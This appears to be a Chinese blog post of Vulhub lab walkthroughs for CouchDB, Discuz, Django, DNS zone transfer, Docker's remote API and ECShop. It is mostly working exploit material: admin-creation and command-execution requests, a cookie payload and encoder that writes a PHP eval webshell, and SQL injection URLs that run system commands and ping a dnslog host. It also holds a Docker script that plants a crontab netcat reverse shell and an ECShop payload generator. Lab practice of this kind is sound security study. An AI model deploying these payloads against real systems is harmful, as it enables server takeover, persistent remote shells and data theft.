+<h4 id="2-cve-2017-12636"><a href="#2-cve-2017-12636" class="headerlink" title="2.cve-2017-12636"></a>2.cve-2017-12636</h4><h5 id="背景：-3"><a href="#背景：-3" class="headerlink" title="背景："></a>背景：</h5><p>CVE-2017-12636是一个<strong>任意命令执行漏洞</strong>，我们可以通过config <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=api&spm=1001.2101.3001.7020">api</a>修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>管理用户可以通过HTTP（S）配置数据库服务器，其中可以启用的配置选项包括操作系统级二进制文件的路径。这允许CouchDB管理员用户以CouchDB用户的身份执行任意shell命令，包括从公共互联网上下载和执行脚本。</p>
+<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>小于 1.7.0 以及小于 2.1.1</p>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>（1）漏洞需要依靠当初同时爆出的CVE-2017-12635提升权限。</p>
+<p>利用 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42250835/article/details/120905030">CVE-2017-12635</a> 先增加一个管理员用户。</p>
+<p>增加管理用户的数据包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: 192.168.227.128:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20220719160204215.png" alt="image-20220719160204215"></p>
+<p>（2）小于1.7.0时，执行</p>
+<p>curl -X PUT ‘<a target="_blank" rel="noopener" href="http://vulhub:vulhub@192.168.227.128:5984/_config/query_servers/cmd&#39;">http://vulhub:vulhub@192.168.227.128:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘</p>
+<p>第一个请求是添加一个名字为cmd的query_servers，其值为”id &gt;/tmp/success”，这就是我们要执行的命令。</p>
+<p>curl -X PUT ‘<a target="_blank" rel="noopener" href="http://vulhub:vulhub@192.168.227.128:5984/vultest&#39;">http://vulhub:vulhub@192.168.227.128:5984/vultest&#39;</a></p>
+<p>curl -X PUT ‘<a target="_blank" rel="noopener" href="http://vulhub:vulhub@192.168.227.128:5984/vultest/vul&#39;">http://vulhub:vulhub@192.168.227.128:5984/vultest/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br>第二、三个请求是添加一个数据库和文档，这里添加了一个可以查询的。</p>
+<p><img src="/images/image-20220719161353593.png" alt="image-20220719161353593"></p>
+<p>curl -X POST ‘<a target="_blank" rel="noopener" href="http://vulhub:vulhub@192.168.227.128:5984/vultest/_temp_view?limit=10&#39;">http://vulhub:vulhub@192.168.227.128:5984/vultest/_temp_view?limit=10&#39;</a> -d ‘{“language”:”cmd”,”map”:””}’ -H ‘Content-Type:application/json’</p>
+<p>第四个请求在这个数据库里进行，因为我将其设置为cmd，这里就是我最初cmd的开始添加的命名的query_servers最后触发命令执行。</p>
+<p><img src="/images/image-20220719161420865.png" alt="image-20220719161420865"></p>
+<p>（3）然后登录容器查看到success即为成功。</p>
+<p><img src="/images/image-20220719161317773.png" alt="image-20220719161317773"></p>
+<h3 id="4-discuz"><a href="#4-discuz" class="headerlink" title="(4)discuz"></a>(4)discuz</h3><h4 id="1-wooyun-2010-080723（代码执行）"><a href="#1-wooyun-2010-080723（代码执行）" class="headerlink" title="1.wooyun-2010-080723（代码执行）"></a>1.wooyun-2010-080723（代码执行）</h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Crossday Discuz! Board（简称 Discuz!）是一套通用的社区论坛软件系统</p>
+<p>Discuz 7.x 6.x版本，由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，<strong>我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</strong></p>
+<p>如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是<strong>命令执行漏洞</strong>。</p>
+<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>(1)配置Discuz环境</p>
+<p><img src="/images/image-20220719170034337.png" alt="image-20220719170034337"></p>
+<p>进入后进入默认模块开启抓包，随便点击一篇帖子，然后将Cookie修改后发包。</p>
+<p>Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</p>
+<p><img src="/images/image-20220719170655702.png" alt="image-20220719170655702"></p>
+<p>即可执行phpinfo()</p>
+<p>同时还可以同样的方法传入cookie写入一句话木马文件，文件为x.php</p>
+<p>借鉴网上大佬写的ascii与字符互换的字符脚本，方便修改poc的文件名和密码</p>
+<p>import re</p>
+<p>ASCII = ord(Word)</p>
+<p>Word = chr(ASCII)</p>
+<p>ASCII -&gt; Word</p>
+<p>def ASCII2word(ASCIIs):<br>    for c in re.findall(r”(\d+)”, ASCIIs):<br>        print(chr(int(c)),end=””)</p>
+<p>Word -&gt; ASCII</p>
+<p>def word2ASCII(words):<br>    ASCIIs = “”<br>    for word in words:<br>        ASCIIs += “Chr(“ + str(ord(word)) + “).”<br>    print(ASCIIs)</p>
+<p>asciis = “Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)”<br>ASCII2word(asciis)</p>
+<p>words = “fputs(fopen(‘x.php’,’w’),’<?php @eval($_POST[pwd])?>‘);”<br>word2ASCII(words)</p>
+<p>然后在蚁剑上面就可以连接成功了。</p>
+<h4 id="2-x3-4-arbitrary-file-deletion（任意文件删除漏洞）"><a href="#2-x3-4-arbitrary-file-deletion（任意文件删除漏洞）" class="headerlink" title="2.x3.4-arbitrary-file-deletion（任意文件删除漏洞）"></a>2.x3.4-arbitrary-file-deletion（任意文件删除漏洞）</h4><h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器<strong>开启了SSI与CGI支持</strong>，我们可以<strong>上传一个shtml文件</strong>，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
+<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="/images/image-20220719172536627.png" alt="image-20220719172536627"></p>
+<p>注册用户<code>http://your-ip/member.php?mod=register</code><br>在个人设置页面<code>http://your-ip/home.php?mod=spacecp</code>找到自己的<strong>formhash</strong>和<strong>Cookie</strong></p>
+<p><img src="/images/image-20220719175236480.png" alt="image-20220719175236480"></p>
+<p>带上自己的Cookie、formhash发送如下数据包：</p>
+<p>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1<br>Host: localhost<br>Content-Length: 367<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryPFvXyxL45f34L12s<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.8,en;q=0.6<br>Cookie: CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fextensions%2Fwebservices%2Ecfm; vv3_sid=1hJRz4; vv3_visitedfid=2; NY7_sid=J2ow6z; e1p_sid=x57H7z; PzlL_2132_saltkey=Gk2e7ZsJ; PzlL_2132_lastvisit=1561686597; PzlL_2132_ulastactivity=3285tPqd81cIiRoeYEyWJNghJ5aPE6Xynif3dFar3XaP4dhFDq6R; PzlL_2132_nofavfid=1; PzlL_2132_smile=1D1; JxMl_2132_saltkey=mstlA2ao; JxMl_2132_lastvisit=1561686868; JxMl_2132_sid=km296E; JxMl_2132_lastact=1561690519%09home.php%09spacecp; JxMl_2132_seccode=1.f498a97f650d5ece6b; JxMl_2132_ulastactivity=d332HbLFI1JPYWIYb%2B1nGX%2FyTTFfWpeCw73GpArP0s9lZ4mPfCi0; JxMl_2132_auth=8b60jSDfppWHWMLa9Lm93O6bwgTtY3K97hxp%2FBjoIwVchM9HVA6J1IBpMpFlrkZPOucMFSseiTG3cknzFFTb; JxMl_2132_nofavfid=1; JxMl_2132_noticeTitle=1<br>Connection: close</p>
+<p>——WebKitFormBoundaryPFvXyxL45f34L12s<br>Content-Disposition: form-data; name=”formhash”</p>
+<p>3ee271f5<br>——WebKitFormBoundaryPFvXyxL45f34L12s<br>Content-Disposition: form-data; name=”birthprovince”</p>
+<p>../../../Discuz.txt<br>——WebKitFormBoundaryPFvXyxL45f34L12s<br>Content-Disposition: form-data; name=”profilesubmit”</p>
+<p>1<br>——WebKitFormBoundaryPFvXyxL45f34L12s–</p>
+<p><img src="/images/Discuz5.png" alt="Discuz5"></p>
+<ul>
+<li>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://127.0.0.1/bbs2/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;deletefile[birthprovince]=aaaaaa&quot;method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot;name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot;name=&quot;formhash&quot; value=&quot;3ee271f5&quot;/&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=&quot;text&quot;name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/from&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用浏览器打开<code>upload.html</code>页面，上传一个正常图片。此时脏数据应该已被提取出，即<code>discuz.txt</code>文件被删除。</li>
+</ul>
+<p><img src="/images/Discuz6.png" alt="Discuz6"></p>
+<p>上传文件A，然后再上传一个图片文件B，由于B的存在，将A覆盖删除,所以discuz.txt会被替换掉，同时也可以用robots.txt做实验。</p>
+<h3 id="django"><a href="#django" class="headerlink" title="django"></a>django</h3><h4 id="背景：-4"><a href="#背景：-4" class="headerlink" title="背景："></a>背景：</h4><p>Django是一个开源代码的<strong>web应用框架</strong>，由<strong>python</strong>来写成，采用MTV的框架模式。首选框架，其主要目的是简便、快速的开发数据库驱动的网站。</p>
+<h5 id="（1）cve-2017-12794（xss）"><a href="#（1）cve-2017-12794（xss）" class="headerlink" title="（1）cve-2017-12794（xss）"></a>（1）cve-2017-12794（xss）</h5><h5 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h5><p>Django1.10.8之前的版本和1.11.5之前的1.11.x版本中的Technical500Template存在安全漏洞,该漏洞源于程序没有正确的过滤用户提交的输入。远程攻击者可利用该漏洞在浏览器中执行任意脚本代码。</p>
+<p>其debug模式中的缺陷所导致，当发现有同样类型异常时，关联了上一个异常和当前的新异常，最后，在500页面中被输出。这个异常被拼接进The above exception () was the direct cause of the following exception，最后触发<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XSS&spm=1001.2101.3001.7020">XSS</a></p>
+<h5 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>搭建成功后我们访问并创建用户：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">your-ip:8000/create_user/?username=<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(ccooll)<span class="symbol">&amp;lt;</span>/script&amp;gt</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再次访问该页面即可触发漏洞.</p>
+<p>其触发的异常为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">duplicate key value violates unique constraint <span class="string">&quot;xss_user_username_key&quot;</span></span><br><span class="line">DETAIL: Key (username)=(&lt;script&gt;alert(ccooll)&lt;/script&gt;) already exists.</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-cve-2018-14574-重定向URL跳转漏洞"><a href="#2-cve-2018-14574-重定向URL跳转漏洞" class="headerlink" title="(2)cve-2018-14574(重定向URL跳转漏洞)"></a>(2)cve-2018-14574(重定向URL跳转漏洞)</h5><p>Django1.11.15之前的1.11.x版本以及Django2.0.8之前的Django2.0.x版本</p>
+<p>漏洞利用：</p>
+<p>访问192.168.227.128:8080//<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+<p>重定向到百度。</p>
+<h5 id="（3）cve-2019-14234（sql注入漏洞）"><a href="#（3）cve-2019-14234（sql注入漏洞）" class="headerlink" title="（3）cve-2019-14234（sql注入漏洞）"></a>（3）cve-2019-14234（sql注入漏洞）</h5><p>参考博客:(<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42250835/article/details/121106792">https://blog.csdn.net/weixin_42250835/article/details/121106792</a>)</p>
+<p>支持很多数据库引擎，包括<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Postgresql&spm=1001.2101.3001.7020">Postgresql</a>、Mysql、Oracle、Sqlite3等，但与Django天生为一对儿的数据库莫过于Postgresql了，Django官方也建议配合Postgresql一起使用。相比于Mysql，Postgresql支持的数据类型更加丰富，其对JSON格式数据的支持也让这个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">关系型数据库</a>拥有了NoSQL的一些特点。</p>
+<p>Django 主开发分支</p>
+<p>Django 2.2.x &lt; 2.2.4</p>
+<p>Django 2.1.x &lt; 2.1.11</p>
+<p>Django 1.11.x &lt; 1.11.23</p>
+<h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。</p>
+<p>通过JSONField类获得KeyTransform类并生成sql语句的位置。</p>
+<p>其中key_name是可控的字符串，最终生成的语句是</p>
+<p><code>WHERE (field-&gt;&#39;[key_name]&#39;) =&#39;value&#39;</code> ， 因此可以进行[SQL注入]，Django-Admin中就支持用户控制queryset的查询键名.总的来说，如果你的应用使用了JSONField，且用户可以进入应用的Django-Admin后台，就可以进行SQL注入。同时，通过Postgresql的一些特性（如命令执行方法），即可getshell。</p>
+<h5 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>构造 <code>URL</code> <code>payload</code><br>在GET参数中构造 <code>detail__a&#39;b=123</code> 提交，其中 <code>detail</code> 是模型 <code>Collection</code> 中的 <code>JSONField</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__a&#x27;b=123</span><br></pre></td></tr></table></figure>
+
+<p>此时，后端执行的代码其实就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Collection.objects.filter(**dict(&quot;detail__a&#x27;b&quot;: &#x27;1&#x27;)).all()</span><br></pre></td></tr></table></figure>
+
+<p>网上还看到：结合cve-2019-9193（具有数据库服务器文件读取权限的攻击者可以利用此漏洞执行<strong>任意系统命令</strong>，该漏洞由 <code>PostgreSQL</code> 引发）来进行getshell，</p>
+<p>可以<strong>利用 <code>CVE-2019-14234(SQL注入漏洞)</code> 向服务器传送包含<code>CVE-2019-9193(命令执行漏洞)</code>系统命令的SQL语句，从而利用SQL语句，执行任意系统命令</strong>。</p>
+<p>尝试执行命令,构造shell，创建cmd_exec，命令执行结果提示“no results to fetch”即为执行成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__title&#x27;)%3d&#x27;1&#x27; or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/django.png" alt="django"></p>
+<p>然后用dnslog检测是否可以执行命令 <a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<p>(这个貌似已经被g了)</p>
+<p>构造dnslog检测是否可以执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping%20apelv2y.dnslog.cn%27--%20</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>靶场环境里的postgresql数据库docker没对外的端口映射，如果开了或者真实环境里，还可以结合msf（漏洞利用框架）通过CVE-2019-9193来getshell。</p>
+<p>再次构造命令执行语句，执行 “touch /tmp/test.txt” 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__title&#x27;)%3d&#x27;1&#x27; or 1%3d1 %3bcopy cmd_exec FROM PROGRAM &#x27;touch /tmp/test.txt&#x27;--%20</span><br></pre></td></tr></table></figure>
+
+<p>“touch /tmp/vuln.txt”即为系统命令，可以替换成其他命令并且执行，例如配合 nc 命令获取shell。</p>
+<p>命令执行结果：当提示“no results to fetch”即为执行成功。</p>
+<p>实例-1提供Django的web功能，而实例-2则提供PostgreSQL数据库功能，所以不论SQL注入的结果还是命令执行的结果，都会发生在实例-2上，实践中创建的vuln.txt也在实例_2的tmp目录下。进入容器查看即可。</p>
+<p>docker exec -it xxxxx  /bin/bash</p>
+<h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>参考博客:(<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42250835/article/details/121234943">https://blog.csdn.net/weixin_42250835/article/details/121234943</a>)</p>
+<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>DNS是一种<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F&spm=1001.2101.3001.7020">分布式</a>网络目录服务，主要用于<strong>域名与 IP 地址的相互转换</strong>，以及<strong>控制因特网的电子邮件的发送</strong>。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。<strong>DNS使用TCP和UDP端口53</strong>。</p>
+<p>影响版本：支持axfr记录的版本，例如bind9</p>
+<p>DNS服务器使用域传送功能，来达到主从数据同步的目的。域传送关键配置项为：allow-transfer，通过配置allow-transfer项的参数来达到限制允许获取记录的来源的作用。<strong>bind9默认安装完毕</strong>后，配置项是没有allow-transfer 的，所以如果<strong>不手动添加allow-transfer项，就会存在dns 域传送漏洞。</strong></p>
+<h4 id="1-dns-zone-transfer-DNS域传送漏洞"><a href="#1-dns-zone-transfer-DNS域传送漏洞" class="headerlink" title="(1)dns-zone-transfer(DNS域传送漏洞)"></a>(1)dns-zone-transfer(DNS域传送漏洞)</h4><h6 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h6><p>信息披露<br>暴露子域名/资产清单<br>暴露内网IP</p>
+<h6 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h6><p>DNS服务器分为主服务器，从（备份）服务器，缓存服务器。DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞，漏洞利用者能够获得某个域的所有记录。</p>
+<h6 id="DNS解析类型"><a href="#DNS解析类型" class="headerlink" title="DNS解析类型"></a>DNS解析类型</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. A记录：域名-&gt;IP</span><br><span class="line">   泛解析：*.lsawebtest.top都能指向同一个IP</span><br><span class="line">   </span><br><span class="line">2. cname(别名)记录：多个名字映射到同一台计算机，如www和mail这两个别名都指向lsawebtest.top，分别提供www和mail服务。</span><br><span class="line"></span><br><span class="line">3. NS记录：指定由哪个DNS服务器解析你的域名，如lsawebtest.top/ns2.lsawebtest.top</span><br><span class="line"></span><br><span class="line">4. MX记录：将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理，如@lsawebtest.top结尾的邮件发到MX记录的邮件服务器上，权重小的优先。</span><br><span class="line"></span><br><span class="line">5. TXT记录：域名的说明，可用于SPF(它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件)和域名所有权验证。</span><br><span class="line"></span><br><span class="line">6. AAAA记录：指向IPv6。</span><br></pre></td></tr></table></figure>
+
+<h6 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p>Vulhub使用Bind9来搭建dns服务器，但不代表只有Bind9支持AXFR记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机环境      (vulhub)</span><br><span class="line">攻击机环境    （虚拟机 Kali 2020.2 、Java1.8、Burp）</span><br></pre></td></tr></table></figure>
+
+<p>利用nslookup命令，nmap命令，dig命令进行检测dns域传送漏洞，监听TCP和<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020">UDP</a>的53端口，DNS协议同时支持从这两个端口进行数据传输。因为涉及到1024以下的端口号，所以运行上述命令可能需要root权限。</p>
+<p>（1）kali自带的 dig 命令发送 dns 请求，获取域名 vulhub.com 在目标 dns 服务器上的A记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @192.168.227.131 vulhub.org</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们发送 axfr 类型的 dns 请求：<code>dig @靶机ip -t axfr vulhub.org</code>,<br><code>axfr</code> 指请求传送某个区域的全部记录。我们只要欺骗 <code>dns</code> 服务器发送一个 <code>axfr</code> 请求过去，如果该 <code>dns</code> 服务器上存在该漏洞，就会返回所有的解析记录值.</p>
+<p><img src="../images/dns1.png" alt="dns1"></p>
+<p>(2)nmap命令</p>
+<p>使用nmap扫描器附带的脚本，可以扫描DNS服务器是否存在域传送漏洞。<br>语法为：<code>nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=vulhub.org&quot; -Pn -p 53 ip</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap –script dns-zone-transfer表示加载nmap文件夹下的脚本文件dns-zone-transfer.nse，扩展名.nse可省略</span><br><span class="line"></span><br><span class="line">-script-args dns-zone-transfer.domain=vulhub.org向脚本传递参数，设置列出记录的域是vulhub.org</span><br><span class="line"></span><br><span class="line">-p 53设置扫描53端口</span><br><span class="line"></span><br><span class="line">-Pn  设置通过Ping发现主机是否存活</span><br></pre></td></tr></table></figure>
+
+<p>获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞</p>
+<p>(3)nslookup命令</p>
+<p>  nslookup vulhub.org</p>
+<p><img src="../images/dns2.png" alt="dns2"></p>
+<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="1-unauthorized-rce-未授权访问漏洞"><a href="#1-unauthorized-rce-未授权访问漏洞" class="headerlink" title="(1)unauthorized-rce(未授权访问漏洞)"></a>(1)unauthorized-rce(未授权访问漏洞)</h4><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=docker&spm=1001.2101.3001.7020">docker</a> remote api可以执行docker命令，从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url实现docker命令。</p>
+<p>靶机：ubuntu</p>
+<p>攻击机：kali</p>
+<p>1.访问环境”<a target="_blank" rel="noopener" href="http://your-ip:2375/version">http://your-ip:2375/version</a> ；若能访问，证明存在未授权访问漏洞</p>
+<p>2.使用Docker启动一个容器，并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。可以将命令写入 crontab 配置文件，即可进行反弹shell。以下为python脚本：</p>
+<p>import docker<br>client = docker.DockerClient(base_url=’kali ip’)<br>data = client.containers.run(‘镜像名’, r’’’sh -c “echo ‘* * * * * /usr/bin/nc 靶机ip 4440 -e /bin/sh’ &gt;&gt; /tmp/etc/crontabs/root” ‘’’, remove=True, volumes={‘/etc’: {‘bind’: ‘/tmp/etc’, ‘mode’: ‘rw’}})</p>
+<p>kali主机监听端口4440</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4440</span><br></pre></td></tr></table></figure>
+
+<p>3.执行脚本<br>python3 1.py</p>
+<p>脚本执行完毕后，等待一会即可反弹shell</p>
+<h3 id="ecshop"><a href="#ecshop" class="headerlink" title="ecshop"></a>ecshop</h3><h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p> ECShop是一个B2C独立商店系统，供公司和个人快速建立个性化的在线商店。该系统是基于PHP语言和MYSQL数据库体系结构的跨平台开源程序。在2017年及之前的版本中，存在一个SQL注入漏洞，该漏洞可能会注入有效载荷并最终导致代码执行漏洞。最新版本的3.6.0已修复此漏洞，vulhub使用其最新版本2.7.3和3.6.0非最新版本来重现该漏洞</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43416469/article/details/114019303">https://blog.csdn.net/weixin_43416469/article/details/114019303</a></p>
+<h4 id="（1）xianzhi-2017-02-82239600（SQL注入-远程执行代码漏洞）"><a href="#（1）xianzhi-2017-02-82239600（SQL注入-远程执行代码漏洞）" class="headerlink" title="（1）xianzhi-2017-02-82239600（SQL注入/远程执行代码漏洞）"></a>（1）xianzhi-2017-02-82239600（SQL注入/远程执行代码漏洞）</h4><p>网上的脚本可以为2.x和3.x生成POC:</p>
+<?php
+$shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");
+$id = "-1' UNION/*";
+$arr = [
+    "num" => sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
+    "id" => $id
+];
+
+$s = serialize($arr);
+
+$hash3 = '45ea207d7a2b68c49582d2d22adf953a';
+$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';
+
+echo "POC for ECShop 2.x: \n";
+echo "{$hash2}ads|{$s}{$hash2}";
